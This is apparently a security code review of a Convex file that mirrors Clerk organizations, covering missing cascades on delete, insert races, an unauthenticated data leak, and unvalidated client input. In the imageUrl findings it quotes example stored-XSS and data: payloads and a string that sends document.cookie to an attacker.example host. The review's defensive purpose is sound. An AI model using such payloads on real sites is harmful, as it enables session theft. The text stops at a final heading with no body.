# Tiger-Style Deep-Dive Review — `convex/organizations.ts`

## Verdict
NEEDS WORK — re-verified against current source. All 14 prior findings (4 P1 / 7 P2 / 3 P3) remain present in the code as written; none have been addressed. The deep-dive expands them with concrete call-graph evidence and adds **9 new findings** (1 P1, 4 P2, 4 P3). The file's core contract — orgs are the ownership/billing boundary, Clerk is the source of truth, the mirror must never drift — is violated on every write path and on every delete. The single most damning new fact: `getBySlug` and `listMine` have **zero callers** anywhere in `apps/web/src` or `apps/gateway/src` — the public unauthenticated leak query (P1 #4) exists solely as attack surface with no consumer. The second: a deleted org can be **resurrected with a zeroed wallet** by any stale JWT or any late-arriving `organization.updated` webhook, silently destroying prepaid credits and publisher earnings (new P2). Orgs are the root of the ownership tree; this file is not safe to ship as the billing boundary.

## File Stats
- **Path:** `convex/organizations.ts`
- **LOC:** 167 (unchanged since prior review)
- **Exports:** 5 (`getBySlug` query, `listMine` query, `upsertFromClerk` internalMutation, `deleteFromClerk` internalMutation, `ensureOrganization` mutation) + 1 private helper (`ensureWallet`)
- **Role:** Mirrors Clerk organizations into Convex. The org row is the root of the entire ownership/billing tree: `wallets`, `projects`, `specs`, `specVersions`, `specEmbeddings`, `webhookEndpoints`, `webhookDeliveries`, `usageEvents`, `payments`, `publisherEarnings`, `publisherTransfers`, `organizationPayments`, `checkoutIntents`, `keySettings`, `notifications` all key off `organizationId` or `clerkOrgId` resolved here (see `convex/schema.ts:6-345`). Correctness in this file is load-bearing for the whole platform.
- **Callers (verified):**
  - `upsertFromClerk` ← `convex/http.ts:61` (`organization.created`/`updated` webhook)
  - `deleteFromClerk` ← `convex/http.ts:70` (`organization.deleted` webhook)
  - `ensureOrganization` ← `apps/web/src/hooks/use-ensure-mirror.ts:42`, `apps/web/src/lib/ensure-mirror.ts:108`
  - `getBySlug` ← **no callers found** (dead public API; see new finding P2 #15)
  - `listMine` ← **no callers found** (dead public API; see new finding P2 #15)

## Findings

---

### [SEV: P1] `deleteFromClerk` does not cascade — orphans 13 org-owned tables and destroys referential integrity of the entire ownership tree *(VERIFIED)*
**Location:** `convex/organizations.ts:88-116`; cascade reference `convex/projects.ts` (`deleteProject`); schema `convex/schema.ts:6-345`.

```ts
if (wallet !== null) {
  const entries = await ctx.db.query("walletEntries")
    .withIndex("by_wallet", (q) => q.eq("walletId", wallet._id)).collect();
  for (const entry of entries) { await ctx.db.delete(entry._id); }
  await ctx.db.delete(wallet._id);
}
await ctx.db.delete(existing._id);
```

**Verified against current schema.** `deleteFromClerk` touches only `wallets`, `walletEntries`, and the `organizations` row. Every other org-owned table is left fully populated pointing at a non-existent org:

| Table | FK field | Orphaned? |
|---|---|---|
| `projects` | `organizationId` | yes |
| `specs`, `specVersions`, `specEmbeddings` | via `projects.organizationId` | yes (transitive) |
| `webhookEndpoints`, `webhookDeliveries` | via `projects` | yes (transitive) |
| `usageEvents` | `organizationId` (`by_org`) | yes |
| `payments` | `organizationId` (`by_organization`) | yes |
| `publisherEarnings` | `publisherOrganizationId` (`by_publisher`) | yes |
| `publisherTransfers` | `publisherOrganizationId` (`by_publisher`) | yes |
| `organizationPayments` | `organizationId` (`by_organization`) | yes |
| `checkoutIntents` | `organizationId` (`by_organization`) | yes |
| `keySettings` | `clerkOrgId` (`by_org`) | yes |
| `notifications` | `clerkOrgId` (`by_org`) | yes |
| `connectedPayouts` | via `stripeConnectedAccountId` | yes (transitive via `organizationPayments`) |

**Impact (unchanged + expanded):** (1) `requireProjectMember` (`convex/lib/auth.ts:65-86`) does `ctx.db.get(project.organizationId)` → `null` → throws `"Organization not found"`. Every project, spec, webhook, key-setting, and earnings view for the deleted org is permanently inaccessible to its publishers — no view, no edit, no export, no reattach path. (2) Financial orphans: `payments`, `publisherEarnings`, `publisherTransfers`, `connectedPayouts` reference a deleted org; reconciliation and payout reporting are severed from org identity. (3) **Gateway leak (confirmed against `apps/gateway/src`):** `getGatewayWallet` (`convex/wallets.ts`) queries `keySettings` by `clerkOrgId` and returns them regardless of whether the org row exists — the edge continues to honor key caps, `disabled` flags, and rotation grace for a deleted org. The gateway's `spec-source.ts:167-188` falls back from `clerkOrgId` to `organizationId` as the wallet-DO key, so orphaned `organizationId`-only state can still be reached.

**Fix:** Cascade through org-owned tables before deleting the org row. Reuse `projects.deleteProject`'s cascade for each project (or inline it); delete `usageEvents` (`by_org`), `payments` (`by_organization`), `publisherEarnings` (`by_publisher`), `publisherTransfers` (`by_publisher`), `organizationPayments` (`by_organization`), `checkoutIntents` (`by_organization`), `keySettings` (`by_org` on `clerkOrgId`), `notifications` (`by_org` on `clerkOrgId`). For financial records, prefer soft-delete (`deletedAt` sentinel) over hard delete. Batch per P2 #6 — do not add the cascade without solving the unbounded-loop timeout.

---

### [SEV: P1] `ensureOrganization` trusts client-supplied `name`, `slug`, `imageUrl` — mirror drift, slug-collision DoS, and a stored-XSS render vector *(VERIFIED + EXPANDED)*
**Location:** `convex/organizations.ts:123-167` (args `124-129`, insert `141-148`, patch `156-160`); contract `convex/lib/auth.ts:13-47` (`requireIdentity` already exposes `claims.orgSlug`).

```ts
export const ensureOrganization = mutation({
  args: {
    clerkOrgId: v.string(),
    name: v.string(),
    slug: v.string(),
    imageUrl: v.optional(v.string()),
  },
  handler: async (ctx, args): Promise<Doc<"organizations">> => {
    const claims = await requireIdentity(ctx);
    if (claims.orgId === undefined || claims.orgId !== args.clerkOrgId) {
      throw new Error("Organization does not match authenticated identity");
    }
    // …insert/patch args.name / args.slug / args.imageUrl verbatim…
```

**Verified.** Only `args.clerkOrgId` is validated against the JWT. `args.name`, `args.slug`, `args.imageUrl` are taken verbatim from the client and written to the mirror. The file's own docstring (`:118-122`) claims "clients cannot invent orgs for other tenants" — true for org *identity*, false for org *content*. The JWT already carries authoritative `org_slug` (`requireIdentity` exposes `claims.orgSlug`), so there is no reason to accept `slug` from the client at all.

**Expansion:** `imageUrl: v.optional(v.string())` has **no URL validation** — a member can set `imageUrl` to `"javascript:alert(document.domain)"`, `"data:text/html,…"`, a 10KB blob, or any string. The `organizations` row is rendered in the public catalogue (`apps/web/src/routes/catalogue`) and the app shell org switcher as `<img src={imageUrl}>` — stored payload rendered without sanitization. See new finding P2 #16 for the validation gap; here the point is the trust boundary itself.

**Impact (unchanged):** (1) **Mirror drift**: a member sets `slug` to `"haha"`; every other member's JWT still carries the real `org_slug`, so `getOrgBySlug(realSlug)` → `null` → `requireOrgMemberBySlug` (`convex/lib/auth.ts:43-62`) throws `"Organization not found"` for the entire org. Every project/key/spec mutation is blocked until manual DB fix or a Clerk rename webhook. (2) **Slug-collision DoS**: a member sets their org's `slug` to victim org B's slug. `by_slug` is non-unique (`convex/schema.ts:13`); two rows now share the slug; every `.unique()` read on `by_slug` (`getBySlug:32`, `getOrgBySlug` in `lib/auth.ts`) throws `NonUniqueResponseError` for **both** orgs. (3) **Stored payload** via `imageUrl`/`name` rendered in catalogue and switcher. Direct violation of the stated "never trust client-provided identifiers when auth context supplies them" contract.

**Fix:** Derive `name`/`slug`/`imageUrl` from JWT claims, or drop them from the public-mutation args entirely and let `ensureOrganization` only ensure-exists (insert with slug from `claims.orgSlug`); let the Clerk webhook own all content updates. At minimum:
```ts
if (claims.orgSlug !== undefined && args.slug !== claims.orgSlug) {
  throw new Error("Slug does not match authenticated identity");
}
```
And validate `imageUrl` is an `https://` URL when non-empty (see new P2 #16).

---

### [SEV: P1] `ensureOrganization` and `upsertFromClerk` insert-path race creates duplicate `clerkOrgId` rows — every subsequent `.unique()` read throws, permanently bricking the org *(VERIFIED)*
**Location:** `convex/organizations.ts:67-75` (`upsertFromClerk` insert), `141-148` (`ensureOrganization` insert); schema index `by_clerk_org` (`convex/schema.ts:13`) is not a unique constraint.

**Verified.** Both paths are read-then-insert with no atomicity against a concurrent inserter. Convex indexes are **not unique constraints** — `.unique()` is a read helper that throws if >1 row matches; it does not prevent two transactions from both observing zero rows and both inserting. OCC does not save this case: each transaction's read-set contains no overlapping document and the two inserts target different document ids, so there is no write-write conflict to trigger a retry. Both commit. Same defect class the wallets reviewer rated P0 (`reviews/convex.wallets.ts.md` finding #1), now at the org layer — worse because the org row is the root of the ownership tree.

**Concurrent callers (verified against call graph):**
- Clerk `organization.created` webhook → `upsertFromClerk` (`http.ts:61`), racing the first member's `ensureOrganization` (`use-ensure-mirror.ts:42` or `ensure-mirror.ts:108`).
- Two members of a freshly-created org loading `/app` simultaneously — `useEnsureMirror` fires for both.
- Svix retry of `organization.created` racing the original delivery.

**Impact (unchanged):** Once two `organizations` rows share a `clerkOrgId`, every downstream `.unique()` read throws `NonUniqueResponseError`: `listMine:46`, `getBySlug:32`, `getOrgBySlug` (`lib/auth.ts:30`), `requireOrgMemberBySlug`, `ensureOrganization`'s own read on next call, `ensureWallet:15`, `deleteFromClerk:91`. The entire org — for every member — is bricked: no project access, no wallet ops, no key settings, no mirror recovery. `deleteFromClerk` cannot even clean it up (its first read throws). Manual DB surgery is the only recovery. The wallet-insert inside the same race also creates duplicate `wallets` rows (compounding `reviews/convex.wallets.ts.md` P0 #1).

**Fix:** Make the insert path idempotent under concurrency. Cleanest: route all org+wallet creation through a single authoritative `internalMutation` (`upsertFromClerk`, called only from the Clerk webhook), and make `ensureOrganization` a pure get-or-throw that never inserts. If a public ensure-must-create path is required, insert unconditionally then re-read `by_clerk_org` `.unique()`; on `NonUniqueResponseError`, delete the loser by `_creationTime` and return the survivor — all within the same transaction.

---

### [SEV: P1] `getBySlug` is an unauthenticated public query returning the full org document including Clerk's internal `clerkOrgId` — and it has ZERO callers *(VERIFIED + EXPANDED)*
**Location:** `convex/organizations.ts:29-37`; contrast `requireOrgMemberBySlug` (`convex/lib/auth.ts:43-62`) which enforces membership for the same lookup.

```ts
export const getBySlug = query({
  args: { slug: v.string() },
  handler: async (ctx, args): Promise<Doc<"organizations"> | null> => {
    return await ctx.db
      .query("organizations")
      .withIndex("by_slug", (q) => q.eq("slug", args.slug))
      .unique();
  },
});
```

**Verified + new fact:** grep across `apps/web/src` and `apps/gateway/src` for `organizations.getBySlug` and `organizations.listMine` returns **zero call sites**. The prior `convex.auth.config.ts.md` review claimed "`getBySlug` is a public query with no auth gate — by design (catalogue discovery). Confirmed not a leak since orgs are public catalogue entities." That claim is **not borne out by any actual catalogue caller**: the gateway catalogue (`apps/gateway/src/spec-source.ts:166-190`) derives `clerkOrgId` from its own spec fixtures, not from `getBySlug`. The web catalogue route does not call it either. This is pure dead attack surface.

**Expansion:** The returned `Doc<"organizations">` includes `clerkOrgId`, `_id`, and `_creationTime`. `clerkOrgId` is the join key for `keySettings`, `notifications`, and the gateway Wallet DO (`apps/gateway/src/index.ts:279` does `env.WALLET.idFromName(clerkOrgId)` — the `clerkOrgId` IS the Wallet DO name/key). Disclosing it to unauthenticated callers expands the attack surface for any endpoint that trusts a client-supplied `clerkOrgId`. Combined with the gateway's `/internal/grant` and `/internal/sync` routes (`index.ts:174,179`) which accept `clerkOrgId` from the request body, an attacker who enumerates `clerkOrgId`s via `getBySlug` can target Wallet DO operations by name.

**Impact:** (1) Anonymous enumeration of every org on the platform — name, slug, image, Clerk internal id, Convex `_id`. (2) `clerkOrgId` (the Wallet DO name key) leaked to unauthenticated callers. (3) Enables the slug-collision DoS in P1 #2 — probe `getBySlug` for victim's slug, then collide. (4) **It does all of this for zero benefit** — no caller uses it.

**Fix:** Delete `getBySlug` (no callers — pure removal). If a public org-directory is a future product requirement, expose a separate `listPublicOrgs` query returning only `{ name, slug, imageUrl }` (never `clerkOrgId`/`_id`), behind pagination and rate-limiting, added only when there is a consumer.

---

### [SEV: P1 — NEW] `ensureOrganization` (and `upsertFromClerk`) can resurrect a deleted org with a zeroed wallet — silently destroying prepaid credits and publisher earnings
**Location:** `convex/organizations.ts:54-86` (`upsertFromClerk`), `123-167` (`ensureOrganization`); delete path `:88-116`; webhook dispatch `convex/http.ts:60-72`.

**Problem:** `deleteFromClerk` hard-deletes the org row, wallet, and all `walletEntries`. But `upsertFromClerk`'s insert branch fires whenever `existing === null` — regardless of *why* it's null. Two realistic resurrection paths:

1. **Stale JWT → `ensureOrganization`**: a member's Clerk JWT (lifetime up to 60s) still carries `org_id` after the org is deleted in Clerk. The member's browser navigates → `useEnsureMirror` fires `ensureOrganization` → `claims.orgId === args.clerkOrgId` passes (the JWT is signed by Clerk, so the claim is genuine) → `existing === null` → **inserts a fresh org row + fresh wallet at `balance: 0, sequence: 0`**. The deleted org is now back, with its prepaid balance and publisher earnings ledger gone (they were hard-deleted by `deleteFromClerk`).

2. **Late `organization.updated` webhook → `upsertFromClerk`**: Clerk webhooks are not strictly ordered. An `organization.updated` event for an org that was just deleted (race between rename and delete in Clerk's event stream, or a Svix retry of an update delivered after the delete) hits `upsertFromClerk` → `existing === null` → **inserts a fresh org row + zeroed wallet**. Svix's at-least-once delivery makes this reachable, not theoretical.

Neither insert path checks for a `deletedAt` sentinel (the schema has none — see new P2 #14) or queries whether the org was recently deleted. The resurrection is silent: no log, no audit entry, no settlement of outstanding balance.

**Impact:** Permanent financial data loss with no recovery. A consumer org's prepaid credits vanish (wallet reset to 0); a publisher org's `publisherEarnings` ledger linkage is severed (the earnings rows are orphaned per P1 #1, and the new wallet's `sequence` restarts at 0, so any future `appendWalletEntry` reconciliation is broken). If the org is later re-created legitimately in Clerk (same `clerkOrgId`), it inherits the zeroed wallet — the attacker/resurrector has laundered the balance history. This compounds P2 #10 (hard-delete destroys financial state) — here the destruction is not even final, because a zombie version of the org reappears.

**Fix:** (a) Soft-delete orgs (`deletedAt` sentinel, see new P2 #14) and have `upsertFromClerk`/`ensureOrganization` refuse to insert when a soft-deleted row exists for the same `clerkOrgId` — instead un-delete (clear `deletedAt`) and preserve the wallet/ledger. (b) At minimum, on the insert path, reject if a `deletedAt`-marked row exists for the `clerkOrgId` and surface a `"organization was deleted; contact support"` error rather than silently recreating. (c) Never hard-delete `wallets`/`walletEntries` (see P2 #10).

---

### [SEV: P2] `upsertFromClerk` (rename) races with stale client `ensureOrganization` — last-write-wins reverts the correct slug *(VERIFIED)*
**Location:** `convex/organizations.ts:78-82` (`upsertFromClerk` patch) vs `156-160` (`ensureOrganization` patch); client source `apps/web/src/hooks/use-ensure-mirror.ts:42-50`, `apps/web/src/lib/ensure-mirror.ts:108-112`.

**Verified.** Both the Clerk webhook (`organization.updated` → `upsertFromClerk`) and the web app (`ensureOrganization` with `organization.slug` from the cached Clerk `useOrganization()` object) write `slug` to the same row with no versioning and no claim-recency guard. When an admin renames an org's slug in Clerk, the webhook fires `upsertFromClerk` with the new slug, but a member's browser still holds the *old* `organization` object. The member's `ensureOrganization` runs with the stale slug and overwrites the webhook's correct update — last-write-wins reverts the rename.

**Impact (unchanged):** Mirror drift after any org slug change. `requireOrgMemberBySlug` and `getBySlug` resolve the stale slug; members whose JWT has refreshed to the new `org_slug` can no longer find their org by slug → `"Organization not found"`. Self-heals only if another `organization.updated` webhook fires. Compounds P1 #2.

**Fix:** Stop having the public mutation write `slug`/`name`/`imageUrl` (see P1 #2 fix). Make the Clerk webhook the sole writer of org content; `ensureOrganization` should only ensure-exists. If both writers must coexist, version the row (`updatedAt` / Clerk `updated_at`) and reject stale patches — but the schema has no `updatedAt` (see new P2 #14), so versioning is currently impossible.

---

### [SEV: P2] `deleteFromClerk` does an unbounded `.collect()` + per-entry sequential delete loop — large orgs time out and livelock the webhook *(VERIFIED)*
**Location:** `convex/organizations.ts:103-112`.

```ts
const entries = await ctx.db.query("walletEntries")
  .withIndex("by_wallet", (q) => q.eq("walletId", wallet._id)).collect();
for (const entry of entries) { await ctx.db.delete(entry._id); }
```

**Verified.** `.collect()` materializes every `walletEntries` row into memory, then deletes one at a time in a sequential `await` loop. For a long-lived org with 10⁵–10⁶ ledger entries (usage settlements are append-only, one row per call), this exceeds Convex's mutation wall-clock limit — the mutation aborts. Svix retries; same timeout; retry exhaustion drops the delete event. The same unbounded-loop pattern will recur for every cascade table P1 #1 says is missing — adding the cascade without batching makes the timeout worse.

**Impact (unchanged):** Org deletion silently fails for any org with a substantial ledger; webhook retries livelock; operator must manually intervene. The mutation is atomic (no partial delete), so the org is left in its pre-delete state, but the admin's deletion in Clerk never propagates.

**Fix:** Batch deletes — paginated iteration via `.paginate({ cursor, numItems })`, delete in chunks of a few hundred per mutation, schedule the next chunk via `scheduler.runAfter(0, internal.organizations.deleteFromClerkBatch, …)` until empty, then delete the wallet and org. Or soft-delete the org (`deletedAt`) and let a background job reclaim children in batches. Do not add the missing cascade (P1 #1) without solving this first.

---

### [SEV: P2] No slug validation anywhere — empty, whitespace, oversized, path-traversing, and colliding slugs accepted; `by_slug` is not unique *(VERIFIED)*
**Location:** `convex/organizations.ts:124-128` (args), `29-37` (`getBySlug`), `78-82` and `156-160` (writes); schema `by_slug` index (`convex/schema.ts:13`).

**Verified.** `slug: v.string()` accepts any string — `""`, `" "`, `"\t"`, a 10KB slug, a slug containing `/`, `..`, or `<script>`, or a slug identical to another org's. No format validator, no uniqueness enforcement. `getBySlug` and `getOrgBySlug` call `.unique()`, so any collision throws `NonUniqueResponseError` for both orgs. Because `ensureOrganization` accepts client-supplied slugs (P1 #2), a member can deliberately collide with a victim org.

**Impact (unchanged):** Deliberate or accidental slug collision bricks `getBySlug` and `requireOrgMemberBySlug` for every org sharing the slug. Empty/oversized/path-traversing slugs pollute the index and can break downstream URL routing that embeds the slug (the catalogue route `apps/web/src/routes/catalogue._orgSlug._projectSlug.tsx` parses the slug from the URL path).

**Fix:** Validate slug format at the validator layer (custom `v.string()` checked against `/^[a-z0-9](?:[a-z0-9-]{0,38}[a-z0-9])?$/`, reject empty/whitespace). For uniqueness, query `by_slug` first and reject if a different `clerkOrgId` already owns the slug, or stop accepting client slugs entirely (P1 #2 fix) and trust Clerk's slug uniqueness from the webhook.

---

### [SEV: P2] `deleteFromClerk` does not delete `keySettings` or `notifications` (both keyed by `clerkOrgId`) — orphans persist and the gateway still serves them *(VERIFIED)*
**Location:** `convex/organizations.ts:88-116`; schema `keySettings.by_org` (`clerkOrgId`) and `notifications.by_org` (`clerkOrgId`).

**Verified.** Both `keySettings` and `notifications` are keyed by `clerkOrgId` (not `organizationId`), so the wallet-deletion block (which keys off `existing._id`) does not touch them. After `deleteFromClerk`, `keySettings` rows remain active (`disabled`, `monthlyCapCredits`, `graceUntil`), and `notifications` rows remain unread. The gateway's `getGatewayWallet` (`convex/wallets.ts`) queries `keySettings` by `clerkOrgId` and returns them regardless of whether the org exists — confirmed in `apps/gateway/src/wallet.ts:887-951` where `syncGrants(clerkOrgId)` pulls settings for the (now-deleted) org and the edge honors them.

**Impact (unchanged):** Stale key gates honored for a deleted org; if Clerk ever recycles a `clerkOrgId` across instances, a recreated org inherits the deleted org's key caps. Notifications for the deleted org linger with no consumer.

**Fix:** In `deleteFromClerk`, after resolving `existing`, also delete `keySettings` (`.withIndex("by_org", q => q.eq("clerkOrgId", args.clerkOrgId))`) and `notifications` (`.withIndex("by_org", q => q.eq("clerkOrgId", args.clerkOrgId))`) — batched per P2 #6. Document retention policy if financial/admin notifications must be retained.

---

### [SEV: P2] `ensureOrganization` ignores `claims.orgRole` — any non-admin member can drift the mirror *(VERIFIED)*
**Location:** `convex/organizations.ts:130-167`; `claims.orgRole` populated by `requireIdentity` (`convex/lib/auth.ts:39-47`).

**Verified.** The handler checks only `claims.orgId === args.clerkOrgId` — i.e. that the caller is *some* member of the org. It does not check `claims.orgRole` (Clerk's `org_role` claim, typically `"org:admin"` or `"org:member"`). Any member, including a least-privileged `org:member`, can invoke `ensureOrganization` and overwrite the org's `name`/`slug`/`imageUrl`. Combined with P1 #2, a non-admin member can drift the slug and DoS the entire org's `requireOrgMemberBySlug` lookups.

**Impact (unchanged):** Privilege mismatch with Clerk's own org-role model. Clerk restricts org-metadata edits to admins; the Convex mirror lets any member do it.

**Fix:** Require admin role for the patch path (and ideally for the insert path too):
```ts
if (claims.orgRole !== "org:admin") {
  throw new Error("Only org admins may modify organization metadata");
}
```
If the mutation is reduced to ensure-exists-only (P1 #2 fix), the role check matters less but should still gate any content writes.

---

### [SEV: P2] `deleteFromClerk` hard-deletes the wallet and all `walletEntries` — silently destroys prepaid balance and publisher earnings ledger without settlement or refund *(VERIFIED)*
**Location:** `convex/organizations.ts:103-114`.

**Verified.** On `organization.deleted`, the handler deletes every `walletEntries` row and the `wallets` row. For a consumer org, this destroys the prepaid credit balance with no refund flow. For a publisher org, it destroys the credit ledger backing `publisherEarnings` — and while `publisherEarnings` rows are orphaned rather than deleted (P1 #1), their materialized balance/sequence are gone, breaking any future reconciliation or payout audit. The new P1 resurrection finding makes this worse: the destroyed ledger is not even final.

**Impact (unchanged):** Loss of financial state with no audit trail. If the org is recreated (same `clerkOrgId`, via the resurrection path in new P1 #5), the new wallet starts at `balance: 0` / `sequence: 0` — lost credits are not restorable.

**Fix:** Do not hard-delete `wallets` or `walletEntries` on org deletion. Soft-delete the wallet (`deletedAt` sentinel) and retain the ledger; if balance must be zeroed, record an explicit `admin_adjustment` / `refund_reversal` entry with a `refId` referencing the deletion event so the ledger remains auditable. If hard-delete is mandated by policy, settle outstanding balances (refund prepaid credits, payout pending publisher earnings) *before* deleting.

---

### [SEV: P2] `ensureWallet` `.unique()` throws unhandled on duplicate wallets — propagates to `upsertFromClerk`/`ensureOrganization` and bricks the webhook retry loop *(VERIFIED)*
**Location:** `convex/organizations.ts:11-27` (`ensureWallet`); called from `upsertFromClerk:74,83` and `ensureOrganization:148,161`.

```ts
const existing = await ctx.db.query("wallets")
  .withIndex("by_organization", (q) => q.eq("organizationId", organizationId))
  .unique();
```

**Verified.** `.unique()` throws `NonUniqueResponseError` if >1 wallet row matches. Duplicate wallets can arise from the race in P1 #3 (concurrent `ensureWallet` calls both observing zero rows and both inserting — no unique constraint), or from the pre-existing `getOrCreateWallet` race documented as P0 in `reviews/convex.wallets.ts.md`. When `ensureWallet` throws, the exception propagates up through `upsertFromClerk` (the Clerk webhook handler, `http.ts:61`) and `ensureOrganization` (the web-app mutation). The webhook gets a 500; Svix retries; the retry hits the same throw; retry exhaustion drops the event. The org is stuck with duplicate wallets and no automated recovery.

**Impact (unchanged):** Org stuck: every wallet-touching path (settlement, grant, refund, checkpoint) throws; webhook retries livelock on the throw; duplicate-wallet state is non-recoverable without manual DB surgery.

**Fix:** Centralize wallet creation in one place (the wallets reviewer recommends `organizations.upsertFromClerk` as the sole creator and `wallets.ts:getOrCreateWallet` becoming get-or-throw). After the insert, re-query `by_organization` `.unique()` and reconcile duplicates (delete the newer by `_creationTime`) within the same transaction. Or make `ensureWallet` idempotent: insert if absent, and on the read-back if duplicates exist, delete the losers and return the survivor.

---

### [SEV: P2 — NEW] No `updatedAt` / monotonic version field on `organizations` — mirror reconciliation is impossible by design
**Location:** schema `convex/schema.ts:7-14` (`organizations` table: `clerkOrgId, name, slug, imageUrl` — no `updatedAt`); write paths `convex/organizations.ts:78-82` and `156-160`.

**Problem:** The `organizations` table has no `updatedAt`, no `clerkUpdatedAt`, no version field, and no `createdAt` (only the implicit `_creationTime`). Both write paths (`upsertFromClerk` patch and `ensureOrganization` patch) unconditionally overwrite `name`/`slug`/`imageUrl` with no recency comparison. This is the structural root cause of P2 #5 (stale-JWT revert) and P1 #2 (client drift): even if both writers wanted to implement last-writer-wins-by-recency, **there is no field to compare against**. Clerk's webhook payload includes `updated_at` (ms epoch), and the JWT includes an `iat` (issued-at) claim — but neither is stored, so neither can be consulted.

Compare to the rest of the schema: `organizationPayments`, `payments`, `publisherEarnings`, `publisherTransfers`, `keySettings`, `connectedPayouts`, `checkoutIntents`, `webhookDeliveries`, `paymentEvents`, `specVersions` all carry `updatedAt`/`createdAt`. The ownership root does not. The asymmetry is not deliberate — it is an omission that makes the entire mirror non-reconcilable.

**Impact:** P2 #5 (stale JWT overwrites fresh webhook) is unfixable without this field. Any future attempt to detect drift, reconcile after a split-brain, or implement "the webhook is authoritative; ignore stale client writes" requires a recency signal that does not exist. The mirror is structurally last-write-wins, and the writer that wins is nondeterministic.

**Fix:** Add `updatedAt: v.number()` to the `organizations` table. On every patch, set `updatedAt: Date.now()` (webhook) or derive from the JWT `iat` (client). On patch, reject if the incoming recency is older than the stored `updatedAt`. Better: drop content writes from `ensureOrganization` entirely (P1 #2 fix) and make the webhook the sole writer — then `updatedAt` only needs to track the webhook.

---

### [SEV: P2 — NEW] `imageUrl` accepts any string with no URL validation — stored payload rendered in catalogue and org switcher
**Location:** `convex/organizations.ts:127` (`imageUrl: v.optional(v.string())`), `141-148` (insert), `156-160` (patch); render sites: `apps/web/src/routes/catalogue/*`, app shell org switcher.

**Problem:** `imageUrl: v.optional(v.string())` validates only that the value is a string. Combined with P1 #2 (client controls `imageUrl`), a member can set it to any string: `"javascript:alert(document.domain)"`, `"data:text/html,<script>…</script>"`, a 1MB blob, or `"https://attacker.example/log?cookie="+document.cookie`. The org row is rendered in the public catalogue and the app shell org switcher as `<img src={org.imageUrl}>`. React's `<img src>` does not execute `javascript:` in modern browsers, but `data:` URLs and external `https://` URLs are honored — the latter enabling exfiltration via request logs, and `data:` URLs enabling rendering attacks. Even if React sanitizes the `src` attribute, a future migration to a different render path (e.g., server-rendered `<img>` in a marketing email or PDF invoice) would execute the payload.

The webhook path (`upsertFromClerk`) also accepts `imageUrl: data.image_url ?? undefined` with no validation — Clerk's `image_url` is an `https://` URL in practice, but the contract is not enforced.

**Impact:** Stored payload in the org mirror, rendered in catalogue and switcher. No direct XSS via React `<img src>` today, but the data is unbounded and persists; future render contexts (email, PDF, server HTML) execute it. External `https://` URLs enable request-log exfiltration. Violates "validate inputs" project contract.

**Fix:** Validate at the validator layer:
```ts
imageUrl: v.optional(v.string()),
// in handler:
if (args.imageUrl !== undefined) {
  try {
    const u = new URL(args.imageUrl);
    if (u.protocol !== "https:" || u.href.length > 2048) throw new Error();
  } catch { throw new Error("imageUrl must be an https:// URL"); }
}
```
Or define a custom validator. Reject `data:`, `javascript:`, and oversized URLs at the boundary.

---

### [SEV: P2 — NEW] `getBySlug` and `listMine` are dead code — zero callers anywhere; `getBySlug` is pure unauthenticated leak surface with no consumer
**Location:** `convex/organizations.ts:29-37` (`getBySlug`), `39-52` (`listMine`); grep verified across `apps/web/src`, `apps/gateway/src`, `convex/`.

**Problem:** Grep for `organizations.getBySlug` and `organizations.listMine` across the entire codebase returns **only the definitions and review-file references** — no production caller. `getBySlug` is an unauthenticated public query returning the full `Doc<"organizations">` (including `clerkOrgId`, the Wallet DO name key — see P1 #4). `listMine` is an authenticated query returning `[activeOrg]`. Neither is referenced by any route, component, hook, gateway handler, or Convex internal mutation.

This is the dark side of P1 #4: the leak query doesn't even have a legitimate consumer to justify its exposure. The prior `convex.auth.config.ts.md` review's claim that `getBySlug` is "by design (catalogue discovery)" is not substantiated by any catalogue caller — the gateway catalogue derives `clerkOrgId` from its own spec fixtures (`apps/gateway/src/spec-source.ts:166-190`), and the web catalogue route does not call `getBySlug`.

**Impact:** Two untested, unmonitored public API endpoints. `getBySlug` leaks `clerkOrgId`/`_id`/`_creationTime` to anonymous callers for zero product value. `listMine` returns a misleading array (see P3 #13) that no caller relies on, so its contract is free to drift undetected. Dead public API is a standing attack surface — it cannot be exercised for product value but can be exercised for enumeration.

**Fix:** Delete both. `getBySlug`'s function is subsumed by `requireOrgMemberBySlug` (`convex/lib/auth.ts:43-62`) for authenticated paths. `listMine`'s function (return the active org) is subsumed by reading the active Clerk org client-side. If a public org-directory is ever a real product requirement, add it then, with a curated projection (`{ name, slug, imageUrl }` only), pagination, and rate-limiting.

---

### [SEV: P3] `upsertFromClerk` and `ensureOrganization` patch `imageUrl: args.imageUrl` — undefined leaves stale value, so Clerk image removal does not propagate *(VERIFIED)*
**Location:** `convex/organizations.ts:78-82` and `156-160`; webhook source `convex/http.ts:60-67` (`data.image_url ?? undefined`).

**Verified.** `args.imageUrl` is `v.optional(v.string())`. When the source omits `image_url` (or Clerk sends `null`, coerced to `undefined` via `??` in `http.ts:67`), `db.patch(id, { imageUrl: undefined })` is a no-op — Convex treats `undefined` patch values as "leave unchanged". Removing an org's image in Clerk fires `organization.updated` with no `image_url`, and the Convex mirror retains the stale `imageUrl` forever.

**Impact (unchanged):** Mirror drift on image removal only. Cosmetic, but contradicts "Clerk is source of truth."

**Fix:** Patch with `imageUrl: args.imageUrl ?? null` and change the schema field to `v.optional(v.union(v.string(), v.null()))`. Alternatively, document that image removal is unsupported — the current silent-keep-stale is the worst option.

---

### [SEV: P3] `listMine` is misnamed — returns at most the *active* org, not all orgs the caller is a member of *(VERIFIED + EXPANDED)*
**Location:** `convex/organizations.ts:39-52`.

```ts
export const listMine = query({
  args: {},
  handler: async (ctx): Promise<Doc<"organizations">[]> => {
    const claims = await requireIdentity(ctx);
    if (claims.orgId === undefined) return [];
    const org = await ctx.db.query("organizations")
      .withIndex("by_clerk_org", (q) => q.eq("clerkOrgId", claims.orgId!)).unique();
    return org === null ? [] : [org];
  },
});
```

**Verified.** "listMine" implies "all orgs I am a member of." The implementation returns only the org matching the JWT's *active* `org_id` claim — at most one row. The `claims.orgId!` non-null assertion is safe (guarded by the `undefined` check) but is a code smell. The return type `Doc<"organizations">[]` (array) reinforces the misleading "list" framing.

**Expansion:** Per new P2 #15, `listMine` has zero callers — so the misleading name cannot even be justified by a consumer that wanted the active-org-as-array shape. It is dead, misnamed, and typed to invite misuse.

**Fix:** Delete it (no callers). If retained, rename to `getActiveOrg` returning `Doc<"organizations"> | null`. Membership enumeration belongs to Clerk (`useOrganizationList`), not Convex.

---

### [SEV: P3] Mutation error messages leak authz internals to the client *(VERIFIED)*
